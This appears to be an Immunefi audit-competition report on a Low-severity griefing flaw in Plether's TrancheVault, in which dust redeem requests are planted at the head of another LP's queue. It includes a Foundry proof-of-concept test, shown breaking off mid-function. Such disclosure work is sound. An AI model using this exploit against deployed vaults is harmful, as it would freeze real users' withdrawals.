# \#99701 [SC-Low] Any share holder can plant a worthless dust redeem request at the head of another LP's queue, blocking standard ERC-7540/ERC-4626 claims

**Submitted on Nov 14th 2026 at 20:50:06 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99701
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro
`requestRedeem(shares, controller, owner)` authorizes only the owner side; `controller` is unconstrained, so any dust holder can enqueue a redeem request into an arbitrary LP's FIFO, becoming the queue head. A dust plant settles as a zero-payout refund epoch: `redeem()`/`withdraw()` and `maxRedeem()`/`maxWithdraw()` see only the worthless head and revert or report 0 until the victim cancels or acknowledges the refund (1h cooldown)

## Vulnerability Details

1. The plant path: owner-side-only authorization with an arbitrary controller. `TrancheVault.requestRedeem` (packages/perps/src/TrancheVault.sol:607-633) checks the zero address, a positive amount, the owner's deposit cooldown, `maxRequestRedeem(owner)` and the minimum size, then authorizes `msg.sender` as owner (or operator/ERC-20 allowance). Nothing constrains `controller`:

```solidity
function requestRedeem(
    uint256 shares,
    address controller,
    address owner
) external returns (uint256 requestId) {
    ...
    if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
        revert TrancheVault__DepositCooldown();
    }
    uint256 maxShares = maxRequestRedeem(owner);
    if (shares > maxShares) { revert TrancheVault__ExceededMaxRequestRedeem(owner, shares, maxShares); }
    _requireMinimumRedeemSize(shares, maxShares);
    if (msg.sender != owner && !isOperator[owner][msg.sender]) {
        _spendAllowance(owner, msg.sender, shares);
    }
    _transfer(owner, address(this), shares);

    requestId = _enqueueRedeemRequest(shares, controller);   // <-- victim's queue
    emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
}
```

`_enqueueRedeemRequest` (TrancheVault.sol:689-709) credits the position to `redeemRequests[controller][requestId]` and `_appendControllerRedeem(controller, requestId)` (TrancheVault.sol:1784-1798) inserts it into that controller's FIFO, becoming `controllerRedeemHead[controller]` whenever the victim's redeem queue is empty:

```solidity
function _appendControllerRedeem(address controller, uint256 requestId) internal {
    RedeemPosition storage position = redeemRequests[controller][requestId];
    position.queued = true;
    uint256 tail = controllerRedeemTail[controller];
    if (tail == 0) {
        controllerRedeemHead[controller] = requestId;        // <-- plant lands at the FRONT
    } else { ... }
    controllerRedeemTail[controller] = requestId;
}
```

The escrowed shares are credited to the victim's position; every refund, cancellation or funding payout of that request belongs to the victim (controller), never back to the attacker (owner). The plant is therefore a deliberate sacrifice of the escrowed dust.

2. Dust sizing is permitted by the full-balance dust-exit rule. `_requireMinimumRedeemSize` (TrancheVault.sol:1612-1619) only rejects amounts whose estimated value is below `POOL.minTrancheDepositAssets()` (1 USDG, HousePool.sol:1433-1435) when `shares < maxShares`:

```solidity
function _requireMinimumRedeemSize(uint256 shares, uint256 maxShares) internal view {
    if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
        revert TrancheVault__WithdrawalTooSmall();
    }
}
```

An attacker whose entire unlocked balance is dust (e.g. 500 share wei received by ordinary transfer, ~0.0000005 USDG at the release 1:1000 asset:share pricing) passes because `shares == maxShares`. The attacker only needs the owner-side cooldown to have elapsed; an inherited, aged `lastDepositTime` from the dust source satisfies it (`_update`, TrancheVault.sol:315-335).

3. Epoch timing makes the front placement reliable. Requests target epoch `e+1` before the last-5-minute cutoff and `e+2` at/after it (`_requestEpochWindow`, TrancheVault.sol:546-557; LP_REQUEST_CUTOFF_DURATION = 5 minutes). Planting any time before the cutoff of hour H (or in any earlier hour while the victim's queue is empty) places the dust request in epoch H+1; any victim request submitted after that cutoff or in a later hour is appended behind it in the victim's FIFO. Same-epoch requests merely merge into one position, so the attacker picks the earlier window (in the PoC: plant at :20, victim request at :57).

4. The planted dust epoch settles as a terminal zero-payout refund. `HousePool._fundRedemptionPhase` (packages/perps/src/HousePool.sol:945-1029) quotes each matured head epoch with `netAssetsForShares(remainingShares, principal, supply, 1, 1000, feeBps)` = `floor(shares * (principal+1) / (supply+1000))` (HousePoolRedemptionMathLib.sol:33-51). For a dust-only epoch this floors to zero and the zero-payout branch refunds the whole epoch:

```solidity
uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
    remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
);
if (fullHeadAssets == 0) {
    if (phase.fundedShares != 0) { break; }
    ...
    vault.refundRedeemEpochRemainder(epochId, remainingShares);   // epoch.refundEnabled = true
    ...
}
```

`refundRedeemEpochRemainder` (TrancheVault.sol:1506-1525) marks the epoch `refundEnabled` and removes it from the global queue, but the controller-level position stays queued: after settlement the victim's head request has `pendingRedeemRequest == 0`, `claimableRedeemRequest == 0`, `claimableRedeemAssets == 0` and `redeemRefundPending == true` (TrancheVault.sol:756-821) - permanently worthless until acknowledged, because `pendingRedeemRequest` returns 0 for refund-enabled epochs and cancellation is unavailable once matured (`cancelRedeemRequest` gate, TrancheVault.sol:895-898: `currentLpEpoch() >= requestId || ... -> TrancheVault__RedeemCancellationUnavailable`).

5. Every standard claim surface is gated on that head. The ERC-4626/ERC-7540 entry points route to `controllerRedeemHead[controller]` (TrancheVault.sol:999-1013), as do the claim-capacity views (TrancheVault.sol:1300-1312):

```solidity
function withdraw(uint256 assets, address receiver, address controller) public override returns (uint256) {
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
...
function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

With a worthless head, `_claimRedeem` reverts `ERC4626ExceededMaxRedeem` and `_claimWithdraw` reverts `ERC4626ExceededMaxWithdraw` (TrancheVault.sol:1149-1194). `maxRedeem(victim)`/`maxWithdraw(victim)` report 0. A head advance requires the position to be terminal, funding-claimed and refund-processed (`_maybeCloseRedeemPosition`, TrancheVault.sol:1217-1228), so the victim must first consume the plant. The deposit-side surface (`deposit`/`mint`, TrancheVault.sol:954-997) has the same head-gating on `controllerDepositHead`, and `requestDeposit(assets, victimController, attackerOwner)` plants there analogously (at a >= 1 USDG cost).

6. Escape hatches exist but all tax the victim. The explicit-id extension `claimRedeem(requestId, shares, receiver, controller)` (TrancheVault.sol:1015-1022) ignores the head and keeps paying the victim's later funded requests - exactly as documented in `IAsyncTrancheVault` (packages/perps/src/interfaces/IAsyncTrancheVault.sol:10-20): "Standard ERC-7540 claims consume the controller's oldest outstanding request. A rejected deposit or refundable redeem head must be cancelled or reclaimed before standard claims advance to a later request; explicit-id claim methods preserve deterministic epoch selection for integrations." Clearing the head requires either a pre-maturity `cancelRedeemRequest` (TrancheVault.sol:878-915, available only before the epoch matures) or a post-settlement `claimRedeemRefund` acknowledgement (TrancheVault.sol:917-948) - and both stamp `lastDepositTime[receiver] = block.timestamp`, i.e. a fresh 1-hour cooldown that blocks the victim's next `requestRedeem` and any share transfer:

```solidity
// cancelRedeemRequest
lastDepositTime[receiver] = block.timestamp;      // TrancheVault.sol:912
// claimRedeemRefund
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp;  // TrancheVault.sol:943-945
    _transfer(address(this), receiver, shares);
}
```

The same mechanics apply to the Senior vault (identical `TrancheVault` code).


## Impact Details

Category: griefing / temporary denial of the standard redemption claim surface, with a 1-hour exit-cooldown stamp on every recovery path. No theft, no permanent loss, no protocol-side lock.

Preconditions: (a) the attacker holds any unlocked tranche shares, however small (transfer dust suffices; forfeited to the victim on refund/cancel); (b) the victim's redeem queue is empty at plant time (any LP not yet requesting an exit); (c) the plant lands in an earlier epoch than the victim's next request (plant before the hourly 5-minute cutoff; PoC: 37-minute lead, no front-running).

Impact per victim: while the worthless head sits at `controllerRedeemHead`, `redeem()`/`withdraw()` revert `ERC4626ExceededMaxRedeem`/`MaxWithdraw` and `maxRedeem()`/`maxWithdraw()` report 0. ERC-7540 defines no per-request claim, so standard-surface-only integrations cannot move funded proceeds until the victim (or its operator) processes the plant, and head-based views show zero claimable. Post-maturity cancellation is unavailable; the only standard-surface recovery is the refund acknowledgement - an extra transaction stamping a fresh 1h `lastDepositTime` that blocks the victim's next `requestRedeem`/transfer for an hour. New requests are never blocked beforehand and explicit-id claims work throughout, so the delay is bounded by the victim's own action; no principal-loss path exists (the planted shares and funding belong to the victim).

## References
- packages/perps/src/TrancheVault.sol:607-633 - requestRedeem: owner-side-only authorization; arbitrary `controller`; `_enqueueRedeemRequest(shares, controller)`.
- packages/perps/src/TrancheVault.sol:689-709 - _enqueueRedeemRequest credits `redeemRequests[controller][requestId]` and appends to the controller FIFO.
- packages/perps/src/TrancheVault.sol:1784-1823 - _appendControllerRedeem/_removeControllerRedeem: `controllerRedeemHead` set when the victim's queue is empty; :131 the mapping.
- packages/perps/src/TrancheVault.sol:1612-1619 - _requireMinimumRedeemSize: full-balance (`shares == maxShares`) bypass of the 1 USDG minimum; :1329-1336 maxRequestRedeem = unlocked owner balance; :1631-1638 _unlockedOwnerShares.
- packages/perps/src/TrancheVault.sol:315-335 - _update: transfer cooldown and `lastDepositTime[to]` inheritance (dust sourcing); :39 DEPOSIT_COOLDOWN = 1 hour.
- packages/perps/src/TrancheVault.sol:546-557 - _requestEpochWindow: 5-minute cutoff that separates plant epoch from the victim's request epoch.
- packages/perps/src/HousePool.sol:945-1029 - _fundRedemptionPhase: zero-quote head epochs are refunded via refundRedeemEpochRemainder; packages/perps/src/libraries/HousePoolRedemptionMathLib.sol:33-51 - netAssetsForShares floor.
- packages/perps/src/TrancheVault.sol:1506-1525 - refundRedeemEpochRemainder: `refundEnabled` terminal epoch.
- packages/perps/src/TrancheVault.sol:756-821 - pendingRedeemRequest/claimableRedeemRequest/claimableRedeemAssets/refundableRedeemRequest/redeemRefundPending: the worthless head reports all-zero claimable state.
- packages/perps/src/TrancheVault.sol:999-1013, 954-997 - redeem/withdraw/deposit/mint route to controllerRedeemHead/controllerDepositHead; :1300-1312 - maxWithdraw/maxRedeem head-based views.
- packages/perps/src/TrancheVault.sol:1149-1194 - _claimRedeem/_claimWithdraw revert ERC4626ExceededMaxRedeem/MaxWithdraw against the zero-claimable head.
- packages/perps/src/TrancheVault.sol:878-915 - cancelRedeemRequest: only pre-maturity (:895-898), stamps cooldown (:912).
- packages/perps/src/TrancheVault.sol:917-948 - claimRedeemRefund: refund acknowledgement; stamps cooldown (:943-945).
- packages/perps/src/TrancheVault.sol:1217-1228 - _maybeCloseRedeemPosition: head advance requires terminal + fundingClaimed + refundProcessed.
- packages/perps/src/TrancheVault.sol:1015-1022 - claimRedeem by request id (documented escape); packages/perps/src/interfaces/IAsyncTrancheVault.sol:10-20 - documented head-consumption and explicit-id rules.
- packages/perps/src/HousePool.sol:1433-1435 - minTrancheDepositAssets = 1 USDG (dust-plant sizing context).


## Proof of Concept

## Proof of Concept

create and run the below test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {MockUSDG} from "./mocks/MockUSDG.sol";
import {MockPyth} from "./mocks/MockPyth.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title Third-party redeem-request planting at the head of another LP's queue
/// @notice TrancheVault.requestRedeem(shares, controller, owner) authorizes only the
///         OWNER side (msg.sender == owner, operator, or ERC-20 allowance) while the
///         CONTROLLER argument is unconstrained. Any holder of unlocked vault shares
///         can therefore enqueue a redeem request into an arbitrary LP's controller
///         queue. When the victim's redeem queue is empty, the planted request
///         becomes controllerRedeemHead[victim]; the victim's own later request is
///         appended behind it. A dust-sized plant (allowed as a "full balance"
///         redemption even below the 1 USDG request minimum) is worthless: it
///         settles as a zero-payout refund epoch, and the terminal, refund-pending
///         head then gates every standard claim surface (ERC-4626 redeem/withdraw
///         and maxRedeem/maxWithdraw) until the victim processes it. The explicit-id
///         extension claimRedeem(requestId, ...) keeps working throughout, exactly
///         as documented in IAsyncTrancheVault.
contract PlantTest is Test {
    // ------------------------------------------------------------------
    // Release parameters (identical stack to the prior PoCs)
    // ------------------------------------------------------------------
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint256 internal constant MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant MAINT_MARGIN_BPS = 10;
    uint256 internal constant INIT_MARGIN_BPS = 20;
    uint256 internal constant FAD_MARGIN_BPS = 300;
    uint256 internal constant BASE_CARRY_BPS = 500;
    uint256 internal constant MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant BOUNTY_BPS = 10;
    uint256 internal constant KEEPER_SHARE_BPS = 5_000;
    uint256 internal constant PROTOCOL_SHARE_BPS = 0;
    uint256 internal constant FROZEN_CLOSE_SPREAD_BPS = 50;

    // Anchor: Sunday, 19 Nov 2023 23:00:00 UTC. The 72h pool-config timelock
    // matures Wednesday 23:01 UTC; scenario epochs run Thursday (no frozen window).
    uint256 internal constant BASE = 1_700_352_000 + 23 hours;

    uint256 internal constant BIGJUNIOR_DEPOSIT = 2_100_000e6; // background junior LP ($2.1M)
    uint256 internal constant VICTIM_DEPOSIT = 500_000e6; // affected junior LP ($500k)
    // Dust plant: 500 share wei. With the release 1:1000 asset:share pricing the
    // epoch quote floor(500*(P+1)/(S+1000)) is zero, so the epoch takes the
    // zero-payout refund branch at settlement. 500 wei of shares is ~0.0000005 USDG.
    uint256 internal constant PLANT_SHARES = 500;

    struct Stack {
        MockUSDG token;
        MockPyth pyth;
        MarginClearinghouse clearinghouse;
        CfdEngine engine;
        HousePool pool;
        TrancheVault seniorVault;
        TrancheVault juniorVault;
        PletherOracle oracle;
        CfdEngineLens engineLens;
        OrderRouter router;
        OrderLifecycleBook lifecycleBook;
        HousePoolRedemptionMathSidecar redMath;
    }

    address internal bigJunior = makeAddr("bigJunior");
    address internal victim = makeAddr("victim"); // main affected LP (controller)
    address internal victim2 = makeAddr("victim2"); // second affected LP (early-cancel demo)
    address internal attacker = makeAddr("attacker"); // share-holding planter (owner)
    address internal attacker2 = makeAddr("attacker2"); // second planter (early-cancel demo)
    address internal owner = makeAddr("owner");
    address internal deployer = makeAddr("deployer");
    address internal seedReceiver = makeAddr("seedReceiver");

    bytes[] internal pythData;

    function setUp() public {
        pythData.push(bytes("pyth-payload"));
    }

    // ------------------------------------------------------------------
    // Deployment (identical wiring to the release stack)
    // ------------------------------------------------------------------

    function _computeCreateAddress(address acct, uint256 nonce) internal pure returns (address) {
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), acct, bytes1(uint8(nonce))))))
        );
    }

    function _deployStack() internal returns (Stack memory s) {
        vm.startPrank(owner);
        s.pyth = new MockPyth();
        s.token = new MockUSDG();
        s.clearinghouse = new MarginClearinghouse(address(s.token));
        s.engine = new CfdEngine(
            address(s.token),
            address(s.clearinghouse),
            CAP_PRICE,
            CfdTypes.RiskParams({
                vpiFactor: VPI_FACTOR,
                maxSkewRatio: MAX_SKEW_RATIO,
                maintMarginBps: MAINT_MARGIN_BPS,
                initMarginBps: INIT_MARGIN_BPS,
                fadMarginBps: FAD_MARGIN_BPS,
                baseCarryBps: BASE_CARRY_BPS,
                minBountyAssets: MIN_BOUNTY_ASSETS,
                bountyBps: BOUNTY_BPS,
                keeperShareBps: KEEPER_SHARE_BPS,
                protocolShareBps: PROTOCOL_SHARE_BPS
            }),
            FROZEN_CLOSE_SPREAD_BPS
        );
        vm.stopPrank();

        vm.startPrank(owner);
        TerminalNavBookV2 navBook = new TerminalNavBookV2(address(s.engine), uint32(CAP_PRICE));
        s.engine.setTerminalNavBook(address(navBook));

        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar sidecar = new CfdEngineSettlementSidecar(address(s.engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(s.engine), owner);
        s.engine.setDependencies(address(planner), address(sidecar), address(engineAdmin));

        s.redMath = new HousePoolRedemptionMathSidecar();
        s.pool = new HousePool(address(s.token), address(s.engine), address(s.redMath));
        s.engine.setPool(address(s.pool));

        s.seniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), true, "Plether Senior", "PT-SR", 0, address(0));
        s.pool.setSeniorVault(address(s.seniorVault));

        address treasury = s.engine.protocolTreasury();
        s.juniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), false, "Plether Junior", "PT-JR", 0, treasury);
        s.pool.setJuniorVault(address(s.juniorVault));

        s.clearinghouse.setEngine(address(s.engine));
        s.engineLens = new CfdEngineLens(address(s.engine));

        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = bytes32(uint256(0x455552555344)); // "EURUSD"
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 1e18;
        uint256[] memory basePrices = new uint256[](1);
        basePrices[0] = 110_000_000; // 1.10 USD -> basket mark 1.00 (8 decimals)
        bool[] memory inversions = new bool[](1);
        inversions[0] = false;
        s.oracle =
            new PletherOracle(address(s.engine), address(s.pool), address(s.pyth), feedIds, quantities, basePrices, inversions);

        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        vm.stopPrank();

        vm.startPrank(deployer);
        uint64 nonceBefore = vm.getNonce(deployer);
        address predictedRouter = _computeCreateAddress(deployer, nonceBefore + 2);
        OrderLifecycleBook book =
            new OrderLifecycleBook(predictedRouter, address(s.engine), address(s.clearinghouse), address(s.pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        s.lifecycleBook = book;
        s.router = new OrderRouter(
            address(s.engine),
            address(s.engineLens),
            address(s.pool),
            address(s.oracle),
            address(keeperSidecar),
            address(evaluator),
            address(executionSidecar),
            address(book)
        );
        assertEq(address(s.router), predictedRouter, "router address prediction");
        vm.stopPrank();

        vm.prank(owner);
        s.engine.setOrderRouter(address(s.router));

        vm.deal(address(this), 1 ether);
        s.router.updateMarkPrice{value: 1 wei}(pythData);
    }

    function _redeemEpoch(TrancheVault vault, uint256 epochId)
        internal
        view
        returns (uint256 epochShares, uint256 fundedShares, uint256 fundedAssets, bool refundEnabled)
    {
        (epochShares, fundedShares, fundedAssets,,,,,,, refundEnabled) = vault.redeemEpochs(epochId);
    }

    // ------------------------------------------------------------------
    // PoC
    // ------------------------------------------------------------------

    function test_PoC_PlantWorthlessRedeemRequestAtFrontOfVictimQueue() public {
        vm.warp(BASE);
        Stack memory s = _deployStack();

        // Pool config: zero senior coupon rate, 50% senior share cap.
        vm.startPrank(owner);
        s.pool.proposePoolConfig(
            IHousePool.PoolConfig({
                seniorRateBps: 0,
                markStalenessLimit: 60,
                seniorFrozenLpFeeBps: 25,
                juniorFrozenLpFeeBps: 75,
                maxSeniorExposureAssets: 1e30,
                maxSeniorShareBps: 5_000
            })
        );
        vm.stopPrank();

        vm.warp(BASE + 72 hours + 60); // Wednesday 23:01 UTC
        vm.deal(address(this), 1 ether);
        s.router.updateMarkPrice{value: 1 wei}(pythData);
        vm.prank(owner);
        s.pool.finalizePoolConfig();

        // Seeds and trading activation.
        vm.startPrank(owner);
        s.token.mint(owner, 2e6);
        s.token.approve(address(s.pool), 2e6);
        s.pool.initializeSeedPosition(false, 1e6, seedReceiver); // junior seed first
        s.pool.initializeSeedPosition(true, 1e6, seedReceiver);
        s.pool.activateTrading();
        vm.stopPrank();

        // Fund participants.
        s.token.mint(bigJunior, BIGJUNIOR_DEPOSIT);
        s.token.mint(victim, VICTIM_DEPOSIT);

        // Wednesday 23:03 UTC: junior deposit requests -> epoch Thu 00:00.
        vm.startPrank(bigJunior);
        s.token.approve(address(s.juniorVault), BIGJUNIOR_DEPOSIT);
        uint256 depositEpoch = s.juniorVault.requestDeposit(BIGJUNIOR_DEPOSIT, bigJunior, bigJunior);
        vm.stopPrank();
        vm.startPrank(victim);
        s.token.approve(address(s.juniorVault), VICTIM_DEPOSIT);
        s.juniorVault.requestDeposit(VICTIM_DEPOSIT, victim, victim);
        vm.stopPrank();

        // Thursday 00:05 UTC: settlement #0 activates the deposits; both LPs claim
        // (this stamps lastDepositTime = activation time on both wallets).
        vm.warp(BASE + 73 hours + 300);
        s.pool.settleLpEpoch(0, 0);

        vm.prank(bigJunior);
        s.juniorVault.claimDeposit(depositEpoch, BIGJUNIOR_DEPOSIT, bigJunior, bigJunior);
        vm.prank(victim);
        s.juniorVault.claimDeposit(depositEpoch, VICTIM_DEPOSIT, victim, victim);

        uint256 victimShares = s.juniorVault.balanceOf(victim);
        assertGt(victimShares, 0, "victim holds shares");
        emit log_named_uint("victim junior shares", victimShares);
        assertEq(s.juniorVault.controllerRedeemHead(victim), 0, "victim redeem queue starts empty");

        // ------------------------------------------------------------------
        // Thursday 01:10 UTC: the attackers acquire share dust. Any LP past its
        // transfer cooldown can seed them; 500 share wei is far below the 1 USDG
        // request minimum. The transfers inherit an aged cooldown.
        // ------------------------------------------------------------------
        vm.warp(BASE + 74 hours + 600);
        vm.prank(bigJunior);
        s.juniorVault.transfer(attacker, PLANT_SHARES);
        vm.prank(bigJunior);
        s.juniorVault.transfer(attacker2, PLANT_SHARES);
        assertEq(s.juniorVault.balanceOf(attacker), PLANT_SHARES, "attacker holds dust");
        assertEq(s.juniorVault.maxRequestRedeem(attacker), PLANT_SHARES, "dust is the attacker's full balance");

        // ------------------------------------------------------------------
        // Thursday 01:20 UTC: THE PLANT. The attacker (owner) submits a redeem
        // request with the VICTIM as controller. Owner-side authorization is the
        // only check; the dust amount is admitted because it equals the attacker's
        // full unlocked balance (dust-exit rule bypasses the 1 USDG minimum).
        // The request targets epoch Thu 02:00.
        // ------------------------------------------------------------------
        vm.warp(BASE + 74 hours + 1_200);
        vm.prank(attacker);
        uint256 plantEpoch = s.juniorVault.requestRedeem(PLANT_SHARES, victim, attacker);
        // Same-epoch plant into a second victim for the early-cancel demo.
        vm.prank(attacker2);
        uint256 plantEpoch2 = s.juniorVault.requestRedeem(PLANT_SHARES, victim2, attacker2);

        emit log_named_uint("planted epoch (victim)", plantEpoch);
        assertEq(plantEpoch, plantEpoch2, "same-hour plants target the same epoch");
        assertEq(s.juniorVault.controllerRedeemHead(victim), plantEpoch, "PLANT IS AT THE FRONT of victim's queue");
        assertEq(s.juniorVault.controllerRedeemHead(victim2), plantEpoch2, "plant at the front of victim2's queue");
        assertEq(s.juniorVault.balanceOf(attacker), 0, "attacker forfeited the dust into escrow");

        // The planted epoch's settlement quote is exactly zero (zero-payout branch).
        uint256 quote = s.redMath.netAssetsForShares(
            PLANT_SHARES, s.pool.juniorPrincipal(), s.juniorVault.totalSupply(), 1, 1000, 0
        );
        assertEq(quote, 0, "dust epoch quotes zero assets");

        // ------------------------------------------------------------------
        // Thursday 01:30 UTC: early-escape demo (victim2). Before the planted
        // epoch matures, the controller may cancel it -- and keeps the attacker's
        // dust. The cancellation still stamps a fresh 1h cooldown on victim2.
        // ------------------------------------------------------------------
        vm.warp(BASE + 74 hours + 1_800);
        vm.prank(victim2);
        uint256 cancelledShares = s.juniorVault.cancelRedeemRequest(plantEpoch2, victim2, victim2);
        assertEq(cancelledShares, PLANT_SHARES, "victim2 cancelled the plant and kept the dust");
        assertEq(s.juniorVault.controllerRedeemHead(victim2), 0, "victim2 queue cleared");
        assertEq(s.juniorVault.lastDepositTime(victim2), block.timestamp, "cancel stamped victim2 cooldown");
        emit log_string("victim2 early-cancel escape worked (kept the dust, but got a fresh 1h cooldown)");

        // ------------------------------------------------------------------
        // Thursday 01:57 UTC (after the 01:55 cutoff): the victim submits a real
        // redemption of half its balance. It targets the NEXT epoch (Thu 03:00),
        // so it is appended BEHIND the planted head.
        // ------------------------------------------------------------------
        vm.warp(BASE + 74 hours + 3_420);
        uint256 realShares = victimShares / 2;
        vm.startPrank(victim);
        uint256 realEpoch = s.juniorVault.requestRedeem(realShares, victim, victim);
        vm.stopPrank();

        emit log_named_uint("victim real request epoch", realEpoch);
        assertGt(realEpoch, plantEpoch, "victim's real request lands behind the plant");
        assertEq(s.juniorVault.controllerRedeemHead(victim), plantEpoch, "planted dust still the head");
        assertEq(s.juniorVault.controllerRedeemTail(victim), realEpoch, "real request at the tail");

        // ------------------------------------------------------------------
        // Thursday 03:05 UTC: settlement #1. The junior redemption phase processes
        // the planted epoch first: its zero quote triggers the zero-payout refund
        // branch, so the plant becomes a terminal refundable (worthless) request.
        // The victim's real epoch is then funded normally.
        // ------------------------------------------------------------------
        vm.warp(BASE + 76 hours + 300);
        s.pool.settleLpEpoch(0, 0);

        (uint256 plantEpochShares, uint256 plantFundedShares, uint256 plantFundedAssets, bool plantRefundEnabled) =
            _redeemEpoch(s.juniorVault, plantEpoch);
        (uint256 realEpochShares, uint256 realFundedShares, uint256 realFundedAssets, bool realRefundEnabled) =
            _redeemEpoch(s.juniorVault, realEpoch);
        assertEq(plantEpochShares, PLANT_SHARES, "planted epoch shares");
        assertEq(plantFundedShares, 0, "plant funded zero shares");
        assertEq(plantFundedAssets, 0, "plant funded zero assets");
        assertTrue(plantRefundEnabled, "plant epoch is a zero-payout refund epoch");
        assertEq(realFundedShares, realEpochShares, "victim's real epoch fully funded");
        assertGt(realFundedAssets, 0, "victim's real epoch funded with assets");
        assertFalse(realRefundEnabled, "victim's real epoch not refundable");
        emit log_named_uint("victim real epoch funded assets (USDG base units)", realFundedAssets);

        // The planted head is terminal, worthless, and refund-pending.
        assertEq(s.juniorVault.pendingRedeemRequest(plantEpoch, victim), 0, "plant: no pending shares");
        assertEq(s.juniorVault.claimableRedeemRequest(plantEpoch, victim), 0, "plant: no claimable shares");
        assertEq(s.juniorVault.claimableRedeemAssets(plantEpoch, victim), 0, "plant: no claimable assets");
        assertTrue(s.juniorVault.redeemRefundPending(plantEpoch, victim), "plant: refund acknowledgement pending");
        assertEq(s.juniorVault.controllerRedeemHead(victim), plantEpoch, "worthless plant still gates the queue head");

        // ------------------------------------------------------------------
        // Block 1: every STANDARD claim surface is blocked by the worthless head.
        // ------------------------------------------------------------------
        assertEq(s.juniorVault.maxRedeem(victim), 0, "maxRedeem corrupted by head");
        assertEq(s.juniorVault.maxWithdraw(victim), 0, "maxWithdraw corrupted by head");

        vm.prank(victim);
        try s.juniorVault.redeem(1, victim, victim) {
            assertTrue(false, "standard redeem should revert");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason),
                ERC4626.ERC4626ExceededMaxRedeem.selector,
                "standard redeem reverted with ERC4626ExceededMaxRedeem"
            );
            emit log_string("BLOCKED: standard redeem(shares, receiver, controller) -> ERC4626ExceededMaxRedeem");
        }
        vm.prank(victim);
        try s.juniorVault.withdraw(1, victim, victim) {
            assertTrue(false, "standard withdraw should revert");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason),
                ERC4626.ERC4626ExceededMaxWithdraw.selector,
                "standard withdraw reverted with ERC4626ExceededMaxWithdraw"
            );
            emit log_string("BLOCKED: standard withdraw(assets, receiver, controller) -> ERC4626ExceededMaxWithdraw");
        }

        // Post-maturity, the victim can no longer cancel the planted request.
        vm.prank(victim);
        try s.juniorVault.cancelRedeemRequest(plantEpoch, victim, victim) {
            assertTrue(false, "post-maturity cancel should revert");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason),
                TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector,
                "cancel reverted as unavailable"
            );
            emit log_string(
                "BLOCKED: cancelRedeemRequest(plant) post-maturity -> TrancheVault__RedeemCancellationUnavailable"
            );
        }

        // ------------------------------------------------------------------
        // Block 2: the explicit-id claim keeps working (documented escape hatch).
        // ------------------------------------------------------------------
        uint256 entitledShares = s.juniorVault.claimableRedeemRequest(realEpoch, victim);
        uint256 entitledAssets = s.juniorVault.claimableRedeemAssets(realEpoch, victim);
        uint256 partialShares = entitledShares / 2;
        uint256 usdcBefore = s.token.balanceOf(victim);
        vm.prank(victim);
        uint256 paid = s.juniorVault.claimRedeem(realEpoch, partialShares, victim, victim);
        assertGt(paid, 0, "explicit-id claim paid");
